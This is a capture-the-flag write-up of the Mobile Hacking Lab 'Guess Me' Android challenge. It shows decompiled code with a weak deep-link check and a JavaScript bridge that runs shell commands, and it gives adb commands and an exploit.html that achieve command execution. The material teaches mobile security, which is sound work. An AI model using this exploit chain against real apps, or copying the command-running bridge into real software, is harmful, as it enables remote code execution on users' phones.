---
title: "Mobile-Hacking-Lab : 'Guess Me' mobile challenge  "
date: 2026-09-27 13:22:00 +0000
categories: [Writeups, mobile]
tags: [jadex, android-pentesting,mobile-application, CTF , js interface, deep link vulnerability, RCE]
description: "An easy mobile challenge from Mobile Hacking Lab introducing how to exploit a deep link vulnerability and get an RCE"
image:
  path: /assets/images/writeups/mobile/Guess-Me/guess-me-logo.png
  alt: ""
---


# Challenge Overview :
the Geuss-Me application is designed to be vulnerable to deep link and an RCE  vulnerabilities , the app load pages within a WebView which leads to RCE 
, in order to solve this challenge you need to have basic skills in reading java code and basic exploitation skills for deep link and getting RCE (the two vulnerabilities are separate, you don't need to chain them in order to solve the challenge)

# Exploring the application

my methodology begins with exploring the app as a normal user so i can get better understanding of how the app works and functions , let's open the app and see what is waiting for us 

as we can see when we open the app we interfere with the main activity 

![ main activity  ](/assets/images/writeups/mobile/Guess-Me/main-activity.png)

from the image we can get an overview about what the app does , it is a guessing game , we enter a number and it tel's us if we guessed right or wrong 
if we guess the number wrong or right we get message as in the image below

![ wrong guess for the number  ](/assets/images/writeups/mobile/Guess-Me/wrong-guess.png)

![ right guess for the number  ](/assets/images/writeups/mobile/Guess-Me/wrong-guess.png)

from the previous images we can see there is a ? icon in the main activity , upon clicking on this icon we get another activity which is the `WebviewActivity` (as we can see later in the manifest file )

![ webview activity  ](/assets/images/writeups/mobile/Guess-Me/WebviewActivity.png)

what this activity does is providing us with an HTML page that contains the current date and a url to the mobilehackinglab , which is an indicator to it may be vulnerable to deep link vulnerability 
>> to read more about deep link vulnerability , visit this sites: https://nirajkharel.com.np/posts/android-pentesting-deeplinks/ \n https://0xn3va.gitbook.io/cheat-sheets/android-application/intent-vulnerabilities/deep-linking-vulnerabilities


# Hacking the Application 

after getting an overview about the app, the next step i usually do is a fast static analysis 

## Static Analysis 

let's investigate the app by opening `AndroidManifest.xml` file where we can discover how the app is build and know all the android component the app is using 

```xml

<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    android:versionCode="1"
    android:versionName="1.0"
    android:compileSdkVersion="34"
    android:compileSdkVersionCodename="14"
    package="com.mobilehackinglab.guessme"
    platformBuildVersionCode="34"
    platformBuildVersionName="14">
    <!-- ... -->
    <application
        android:theme="@style/Theme.Encoder"
        android:label="@string/app_name"
        android:icon="@mipmap/ic_launcher"
        android:debuggable="true"
        android:allowBackup="true"
        android:supportsRtl="true"
        android:extractNativeLibs="false"
        android:fullBackupContent="@xml/backup_rules"
        android:networkSecurityConfig="@xml/network_config"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
        android:dataExtractionRules="@xml/data_extraction_rules">
        <activity
            android:name="com.mobilehackinglab.guessme.MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <activity
            android:name="com.mobilehackinglab.guessme.WebviewActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data
                    android:scheme="mhl"
                    android:host="mobilehackinglab"/>
            </intent-filter>
        </activity>
        <!-- ... -->
    </application>
</manifest>

```

as we can see from the xml file , we have two activities `MainActivity` and `WebviewActivity` and both are exported which means they can be lunched by another apps (we can access them without directly from the outside ) , and now let's take a look about this two activities and what they do

### Main Activity Analysis

Looking at the `MainActivity` source code we observe standard functionality for handling user interactions and game logic. all of this is just a normal code that does not handle sensitive functionalities , so we shift our intention to the next activity


```java

    //MainActivity
package com.mobilehackinglab.guessme;

import android.content.Intent;
....

/* loaded from: classes3.dex */
public final class MainActivity extends AppCompatActivity {
    private ImageButton aboutusbtn;
    private int attempts;
    private Button exitButton;
    private Button guessButton;
    private EditText guessEditText;
    private final int maxAttempts = 10;
    private Button newGameButton;
    private TextView resultTextView;
    private int secretNumber;

    /* JADX INFO: Access modifiers changed from: protected */
    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(C0892R.layout.activity_main);
        View findViewById = findViewById(C0892R.C0895id.resultTextView);
        Intrinsics.checkNotNullExpressionValue(findViewById, "findViewById(...)");
        this.resultTextView = (TextView) findViewById;
        View findViewById2 = findViewById(C0892R.C0895id.guessEditText);
        Intrinsics.checkNotNullExpressionValue(findViewById2, "findViewById(...)");
        this.guessEditText = (EditText) findViewById2;
        View findViewById3 = findViewById(C0892R.C0895id.guessButton);
        Intrinsics.checkNotNullExpressionValue(findViewById3, "findViewById(...)");
        this.guessButton = (Button) findViewById3;
        View findViewById4 = findViewById(C0892R.C0895id.newGameButton);
        Intrinsics.checkNotNullExpressionValue(findViewById4, "findViewById(...)");
        this.newGameButton = (Button) findViewById4;
        View findViewById5 = findViewById(C0892R.C0895id.exitButton);
        Intrinsics.checkNotNullExpressionValue(findViewById5, "findViewById(...)");
        this.exitButton = (Button) findViewById5;
        View findViewById6 = findViewById(C0892R.C0895id.aboutus);
        Intrinsics.checkNotNullExpressionValue(findViewById6, "findViewById(...)");
        this.aboutusbtn = (ImageButton) findViewById6;
        ImageButton imageButton = this.aboutusbtn;
        Button button = null;
        if (imageButton == null) {
            Intrinsics.throwUninitializedPropertyAccessException("aboutusbtn");
            imageButton = null;
        }
        imageButton.setOnClickListener(new View.OnClickListener() { // from class: com.mobilehackinglab.guessme.MainActivity$$ExternalSyntheticLambda0
            @Override // android.view.View.OnClickListener
            public final void onClick(View view) {
                MainActivity.onCreate$lambda$0(MainActivity.this, view);
            }
        });
        startNewGame();
        Button button2 = this.guessButton;
        if (button2 == null) {
            Intrinsics.throwUninitializedPropertyAccessException("guessButton");
            button2 = null;
        }
        button2.setOnClickListener(new View.OnClickListener() { // from class: com.mobilehackinglab.guessme.MainActivity$$ExternalSyntheticLambda1
            @Override // android.view.View.OnClickListener
            public final void onClick(View view) {
                MainActivity.onCreate$lambda$1(MainActivity.this, view);
            }
        });
        Button button3 = this.newGameButton;
        if (button3 == null) {
            Intrinsics.throwUninitializedPropertyAccessException("newGameButton");
            button3 = null;
        }
        button3.setOnClickListener(new View.OnClickListener() { // from class: com.mobilehackinglab.guessme.MainActivity$$ExternalSyntheticLambda2
            @Override // android.view.View.OnClickListener
            public final void onClick(View view) {
                MainActivity.onCreate$lambda$2(MainActivity.this, view);
            }
        });
        Button button4 = this.exitButton;
        if (button4 == null) {
            Intrinsics.throwUninitializedPropertyAccessException("exitButton");
        } else {
            button = button4;
        }
        button.setOnClickListener(new View.OnClickListener() { // from class: com.mobilehackinglab.guessme.MainActivity$$ExternalSyntheticLambda3
            @Override // android.view.View.OnClickListener
            public final void onClick(View view) {
                MainActivity.onCreate$lambda$3(MainActivity.this, view);
            }
        });
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static final void onCreate$lambda$0(MainActivity this$0, View it) {
        Intrinsics.checkNotNullParameter(this$0, "this$0");
        Intent intent = new Intent(this$0, WebviewActivity.class);
        this$0.startActivity(intent);
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static final void onCreate$lambda$1(MainActivity this$0, View it) {
        Intrinsics.checkNotNullParameter(this$0, "this$0");
        this$0.validateGuess();
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static final void onCreate$lambda$2(MainActivity this$0, View it) {
        Intrinsics.checkNotNullParameter(this$0, "this$0");
        this$0.startNewGame();
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static final void onCreate$lambda$3(MainActivity this$0, View it) {
        Intrinsics.checkNotNullParameter(this$0, "this$0");
        this$0.finish();
    }

    private final void startNewGame() {
        this.secretNumber = Random.Default.nextInt(1, TypedValues.TYPE_TARGET);
        this.attempts = 0;
        TextView textView = this.resultTextView;
        EditText editText = null;
        if (textView == null) {
            Intrinsics.throwUninitializedPropertyAccessException("resultTextView");
            textView = null;
        }
        textView.setText("Guess a number between 1 and 100");
        EditText editText2 = this.guessEditText;
        if (editText2 == null) {
            Intrinsics.throwUninitializedPropertyAccessException("guessEditText");
        } else {
            editText = editText2;
        }
        editText.getText().clear();
        enableInput();
    }

    private final void validateGuess() {
        EditText editText = this.guessEditText;
        if (editText == null) {
            Intrinsics.throwUninitializedPropertyAccessException("guessEditText");
            editText = null;
        }
        Integer userGuess = StringsKt.toIntOrNull(editText.getText().toString());
        if (userGuess != null) {
            this.attempts++;
            if (userGuess.intValue() < this.secretNumber) {
                displayMessage("Too low! Try again.");
            } else if (userGuess.intValue() > this.secretNumber) {
                displayMessage("Too high! Try again.");
            } else {
                displayMessage("Congratulations! You guessed the correct number " + this.secretNumber + " in " + this.attempts + " attempts.");
                disableInput();
            }
            if (this.attempts == this.maxAttempts) {
                displayMessage("Sorry, you've run out of attempts. The correct number was " + this.secretNumber + '.');
                disableInput();
                return;
            }
            return;
        }
        displayMessage("Please enter a valid number.");
    }

    private final void displayMessage(String message) {
        TextView textView = this.resultTextView;
        EditText editText = null;
        if (textView == null) {
            Intrinsics.throwUninitializedPropertyAccessException("resultTextView");
            textView = null;
        }
        textView.setText(message);
        EditText editText2 = this.guessEditText;
        if (editText2 == null) {
            Intrinsics.throwUninitializedPropertyAccessException("guessEditText");
        } else {
            editText = editText2;
        }
        editText.getText().clear();
    }

    private final void disableInput() {
        EditText editText = this.guessEditText;
        Button button = null;
        if (editText == null) {
            Intrinsics.throwUninitializedPropertyAccessException("guessEditText");
            editText = null;
        }
        editText.setEnabled(false);
        Button button2 = this.guessButton;
        if (button2 == null) {
            Intrinsics.throwUninitializedPropertyAccessException("guessButton");
        } else {
            button = button2;
        }
        button.setEnabled(false);
    }

    private final void enableInput() {
        EditText editText = this.guessEditText;
        Button button = null;
        if (editText == null) {
            Intrinsics.throwUninitializedPropertyAccessException("guessEditText");
            editText = null;
        }
        editText.setEnabled(true);
        Button button2 = this.guessButton;
        if (button2 == null) {
            Intrinsics.throwUninitializedPropertyAccessException("guessButton");
        } else {
            button = button2;
        }
        button.setEnabled(true);
    }
}

```

### Webview Activity Analysis

this activity is our target activity, after taking a look in the source code we see that this activity contains some sensitive function that does some sensitive functionalities like `handleDeepLink` , `loadDeepLink` , `loadAssetIndex`

``` java

//WebViewActivity
package com.mobilehackinglab.guessme;

...
import kotlin.text.StringsKt;

/* loaded from: classes3.dex */
public final class WebviewActivity extends AppCompatActivity {
    private WebView webView;

    /* JADX INFO: Access modifiers changed from: protected */
    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(C0892R.layout.activity_web);
        View findViewById = findViewById(C0892R.C0895id.webView);
        Intrinsics.checkNotNullExpressionValue(findViewById, "findViewById(...)");
        this.webView = (WebView) findViewById;
        WebView webView = this.webView;
        WebView webView2 = null;
        if (webView == null) {
            Intrinsics.throwUninitializedPropertyAccessException("webView");
            webView = null;
        }
        WebSettings webSettings = webView.getSettings();
        Intrinsics.checkNotNullExpressionValue(webSettings, "getSettings(...)");
        webSettings.setJavaScriptEnabled(true);
        WebView webView3 = this.webView;
        if (webView3 == null) {
            Intrinsics.throwUninitializedPropertyAccessException("webView");
            webView3 = null;
        }
        webView3.addJavascriptInterface(new MyJavaScriptInterface(), "AndroidBridge");
        WebView webView4 = this.webView;
        if (webView4 == null) {
            Intrinsics.throwUninitializedPropertyAccessException("webView");
            webView4 = null;
        }
        webView4.setWebViewClient(new WebViewClient());
        WebView webView5 = this.webView;
        if (webView5 == null) {
            Intrinsics.throwUninitializedPropertyAccessException("webView");
        } else {
            webView2 = webView5;
        }
        webView2.setWebChromeClient(new WebChromeClient());
        loadAssetIndex();
        handleDeepLink(getIntent());
    }

    /* JADX INFO: Access modifiers changed from: protected */
    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, android.app.Activity
    public void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        handleDeepLink(intent);
    }

    private final void handleDeepLink(Intent intent) {
        Uri uri = intent != null ? intent.getData() : null;
        if (uri != null) {
            if (isValidDeepLink(uri)) {
                loadDeepLink(uri);
            } else {
                loadAssetIndex();
            }
        }
    }

    private final boolean isValidDeepLink(Uri uri) {
        if ((Intrinsics.areEqual(uri.getScheme(), "mhl") || Intrinsics.areEqual(uri.getScheme(), "https")) && Intrinsics.areEqual(uri.getHost(), "mobilehackinglab")) {
            String queryParameter = uri.getQueryParameter("url");
            return queryParameter != null && StringsKt.endsWith$default(queryParameter, "mobilehackinglab.com", false, 2, (Object) null);
        }
        return false;
    }

    private final void loadDeepLink(Uri uri) {
        String fullUrl = String.valueOf(uri.getQueryParameter("url"));
        WebView webView = this.webView;
        WebView webView2 = null;
        if (webView == null) {
            Intrinsics.throwUninitializedPropertyAccessException("webView");
            webView = null;
        }
        webView.loadUrl(fullUrl);
        WebView webView3 = this.webView;
        if (webView3 == null) {
            Intrinsics.throwUninitializedPropertyAccessException("webView");
        } else {
            webView2 = webView3;
        }
        webView2.reload();
    }

    private final void loadAssetIndex() {
        WebView webView = this.webView;
        if (webView == null) {
            Intrinsics.throwUninitializedPropertyAccessException("webView");
            webView = null;
        }
        webView.loadUrl("file:///android_asset/index.html");
    }

    /* compiled from: WebviewActivity.kt */
    @Metadata(m30d1 = {"\u0000\u001c\n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0002\b\u0002\n\u0002\u0010\u000e\n\u0002\b\u0002\n\u0002\u0010\u0002\n\u0002\b\u0002\b\u0086\u0004\u0018\u00002\u00020\u0001B\u0005¢\u0006\u0002\u0010\u0002J\u0010\u0010\u0003\u001a\u00020\u00042\u0006\u0010\u0005\u001a\u00020\u0004H\u0007J\u0010\u0010\u0006\u001a\u00020\u00072\u0006\u0010\b\u001a\u00020\u0004H\u0007¨\u0006\t"}, m29d2 = {"Lcom/mobilehackinglab/guessme/WebviewActivity$MyJavaScriptInterface;", "", "(Lcom/mobilehackinglab/guessme/WebviewActivity;)V", "getTime", "", "Time", "loadWebsite", "", "url", "app_debug"}, m28k = 1, m27mv = {1, 9, 0}, m25xi = ConstraintLayout.LayoutParams.Table.LAYOUT_CONSTRAINT_VERTICAL_CHAINSTYLE)
    /* loaded from: classes3.dex */
    public final class MyJavaScriptInterface {
        public MyJavaScriptInterface() {
        }

        @JavascriptInterface
        public final void loadWebsite(String url) {
            Intrinsics.checkNotNullParameter(url, "url");
            WebView webView = WebviewActivity.this.webView;
            if (webView == null) {
                Intrinsics.throwUninitializedPropertyAccessException("webView");
                webView = null;
            }
            webView.loadUrl(url);
        }

        @JavascriptInterface
        public final String getTime(String Time) {
            Intrinsics.checkNotNullParameter(Time, "Time");
            try {
                Process process = Runtime.getRuntime().exec(Time);
                InputStream inputStream = process.getInputStream();
                Intrinsics.checkNotNullExpressionValue(inputStream, "getInputStream(...)");
                InputStreamReader inputStreamReader = new InputStreamReader(inputStream, Charsets.UTF_8);
                BufferedReader reader = inputStreamReader instanceof BufferedReader ? (BufferedReader) inputStreamReader : new BufferedReader(inputStreamReader, 8192);
                String readText = TextStreamsKt.readText(reader);
                reader.close();
                return readText;
            } catch (Exception e) {
                return "Error getting time";
            }
        }
    }
}

```

* for `handleDeepLink` function it does few checks in order to load the deep link or not , it checks :
    - if the deep link is opened by a valid intent 
    - if the deep link contain a valid remote URL to open
    - if the remote URL adhere to a predefined format ( `isValidDeepLink` returns true )

* for `isValidDeepLink` function it checks the pattern of the url 
    
    ``` java
    private final boolean isValidDeepLink(Uri uri) {
             if ((!Intrinsics.areEqual(uri.getScheme(), "mhl") && !Intrinsics.areEqual(uri.getScheme(), "https")) || !Intrinsics.areEqual(uri.getHost(), "mobilehackinglab")) {
                return false;
             }
        String queryParameter = uri.getQueryParameter("url");

        return queryParameter != null && StringsKt.endsWith$default(queryParameter, "mobilehackinglab.com", false, 2, (Object) null);
    }
    ```

    it checks if :
    - the URI scheme and host match mhl://mobilehackinglab
    - the URI have a query string parameter url
    - the url parameter end in mobilehackinglab.com

in order all this checks passes we need to satisfy all this condition, out uri must use this schema `mhl://mobilehackinglab` and does use `https` and append this string `mobilehackinglab` , if all this is set the condition will be false and we does not enter to the if statement and we end up in the last check 

the last check is used to verify if the url contains query parameter and this query parameters value end up with the `mobilehackinglab.com` domain ,
so to get a true return from this function our url must be in this pattern `mhl://mobilehackinglab/?url=https://www.mobilehackinglab.com`

using this url and start out `webviewactivity` from adb shell using this command 
``` shell
adb shell am start -a "android.intent.action.VIEW" -c "android.intent.category.BROWSABLE" -d "mhl://mobilehackinglab/?url=https://www.mobilehackinglab.com"
```

It will open the https://www.mobilehackinglab.com website:

![ verifying the constructed url ](/assets/images/writeups/mobile/Guess-Me/url-constructing.png)


### Exploiting the deep link vulnerability  

we have discovered that the url validation is week and we can construct our own url that met the conditions and passes the checks , all we need to do is end up our url with the `mobilehackinglab.com` string , let's host our website in our local machine that ends with  `mobilehackinglab.com`

``` shell

# Create required directory
mkdir mobilehackinglab.com

# Create index.html file inside the directory
echo -n 'If you can read this it works!' > mobilehackinglab.com/index.html

# Host the content
python3 -m http.server 4444
```
starting the activity using adb and a url to visit our directory 

 ```shell
    adb shell am start -a "android.intent.action.VIEW" -c "android.intent.category.BROWSABLE" -d "mhl://mobilehackinglab?url=http://192.168.110.128:4444/mobilehackinglab.com"
 ```

 ![ Exploiting the deep link  ](/assets/images/writeups/mobile/Guess-Me/poc.png)

We have successfully bypassed the validation and can now open any website URL as long as it ends with mobilehackinglabs.com

but this does not solve the challenge, our objective is to make the app execute command on our behalf on the system , and this can be done by an RCE

as we saw when we explored the app , the app is fetching the date and time from the system and present them in the html file in the `webviewactivity` , and if you take a closer look at the `webviewactivity` source code you can see that it uses javascript bridge in order to communicate between the app and the system using javascript interface ( the function `MyJavaScriptInterface`)

after reviewing the `MyJavaScriptInterface`function 

``` javascript

/WebViewActivity -> MyJavaScriptInterface
public final class MyJavaScriptInterface {
        public MyJavaScriptInterface() {
        }

        @JavascriptInterface
        public final void loadWebsite(String url) {
            Intrinsics.checkNotNullParameter(url, "url");
            WebView webView = WebviewActivity.this.webView;
            if (webView == null) {
                Intrinsics.throwUninitializedPropertyAccessException("webView");
                webView = null;
            }
            webView.loadUrl(url);
        }

        @JavascriptInterface
        public final String getTime(String Time) {
            Intrinsics.checkNotNullParameter(Time, "Time");
            try {
                Process process = Runtime.getRuntime().exec(Time);
                InputStream inputStream = process.getInputStream();
                Intrinsics.checkNotNullExpressionValue(inputStream, "getInputStream(...)");
                InputStreamReader inputStreamReader = new InputStreamReader(inputStream, Charsets.UTF_8);
                BufferedReader reader = inputStreamReader instanceof BufferedReader ? (BufferedReader) inputStreamReader : new BufferedReader(inputStreamReader, 8192);
                String readText = TextStreamsKt.readText(reader);
                reader.close();
                return readText;
            } catch (Exception e) {
                return "Error getting time";
            }
        }
}

```

we can see `MyJavaScriptInterface` containing functions loadWebsite and getTime. Upon closer examination of the getTime function, we realize that we have control over the command to be executed.  we can serve a malicious HTML file and prompt the application to load it via a deep link, thereby granting us remote code execution.

### Exploiting the Application

First, let’s create and host an exploit.html file that communicates with MyJavaScriptInterface using the exposed method getTime() with the parameter being the command to run using the AndroidBridge defined in the WebviewActivity.

```html
<!-- exploit.html -->

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>

<p id="result">Thank you for visiting</p>

<!-- Add a hyperlink with onclick event -->
<a href="#" onclick="loadWebsite()">Visit MobileHackingLab</a>

<script>

    function loadWebsite() {
       window.location.href = "https://www.mobilehackinglab.com/";
    }

    // Fetch and display the time when the page loads
    var result = AndroidBridge.getTime("id");
    var lines = result.split('\n');
    var timeVisited = lines[0];
    var fullMessage = "Thanks for playing the game\n\n Please visit mobilehackinglab.com for more! \n\nTime of visit: " + timeVisited;
    document.getElementById('result').innerText = fullMessage;

</script>

</body>
</html>
```

Now, all we need to do is serve this HTML file using Python.

```shell

python -m http.server 7777

```

And start our app to get the URL of your web server to achieve remote code execution.

```shell

adb shell am start -a "android.intent.action.VIEW" -c "android.intent.category.BROWSABLE" -d "mhl://mobilehackinglab?url=http://192.168.110.128:7777/mobilehackinglab.com"
```
Upon the page loading, we successfully achieve remote code execution on the victim’s phone.

![ Exploiting the JS interface to execute commands  ](/assets/images/writeups/mobile/Guess-Me/RCE-poc.png)

we can see the output of the id command, which means we can change it to any command available on the device / user and view the outpu


# Conclusion

This lab serves as a valuable lesson in understanding the security implications of loading URLs within a WebView in Android applications. By exploiting vulnerabilities such as insecure JavaScript interfaces, attackers can achieve Remote Code Execution and compromise the integrity of the application. 
